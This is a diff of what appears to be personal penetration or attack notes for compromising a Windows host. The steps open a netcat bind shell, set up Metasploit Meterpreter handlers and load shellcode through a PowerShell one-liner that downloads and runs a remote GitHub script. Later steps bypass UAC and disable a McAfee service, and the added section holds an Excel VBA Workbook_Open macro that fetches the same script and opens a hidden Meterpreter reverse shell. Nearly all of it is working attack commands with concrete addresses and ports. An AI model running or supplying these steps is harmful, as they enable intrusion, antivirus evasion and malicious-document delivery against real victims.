@@ -1,19 +1,22 @@
+Assumption: Remote target's IP is 192.168.1.13 (-rhost)
+            Local kali's IP is 192.168.1.18 (-lhost)
+
 Step 1: Run nc on victim:
       nc.exe -L -p 4444 -e cmd.exe
       
 Step 2: Run multi/handler with shell_bind_tcp payload on kali:
       use exploit/multi/handler
       set payload windows/shell_bind_tcp
-      set rhost
-      set lport
+      set rhost 192.168.1.13
+      set lport 4444
       show options
       exploit
 
 Step 3a: Run another multi/handler with reverse_https payload on kali:
       use exploit/multi/handler
       set payload windows/meterpreter/reverse_https
-      set rhost
-      set lport
+      set lhost 192.168.1.18
+      set lport 4445
       show options
       exploit
       
@@ -21,20 +24,25 @@ Step 3b: Run powershell in the shell received:
       powershell
       IEX (New-Object Net.WebCLient).DownloadString('https://raw.githubusercontent.com/m1nh2uan/online/master/a')
       or IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/m1nh2uan/online/master/a")
-      Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost -Lport
+      Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.18 -Lport 4445 -Force
 
 Step 4: Let's bypassuac
       Ctrl+z to background the current session
       use exploit/windows/local/bypassuac_injection
+      show options
       
 Step 5: disable
-
-sc config MfeFfCoreService start= disabled
+      sc config MfeFfCoreService start= disabled
 
 Step x: misc
+      sc queryex
+      sc config start= disabled
+      tasklist /svc | find /I ""
+      taskkill -IM /F
+      runas /profile /user:domain\user "cmd.exe"
 
-sc queryex
-sc config start= disabled
-tasklist /svc | find /I ""
-taskkill -IM /F
-runas /profile /user:domain\user "cmd.exe"
+Step y: for excel vba
+      Private Sub CommandButton1_Click() or Workbook_Open()
+            Dim i As Variant
+            i = Shell("powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebCLient).DownloadString('https://raw.githubusercontent.com/m1nh2uan/online/master/a'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.18 -Lport 4446 -Force")
+      End Sub
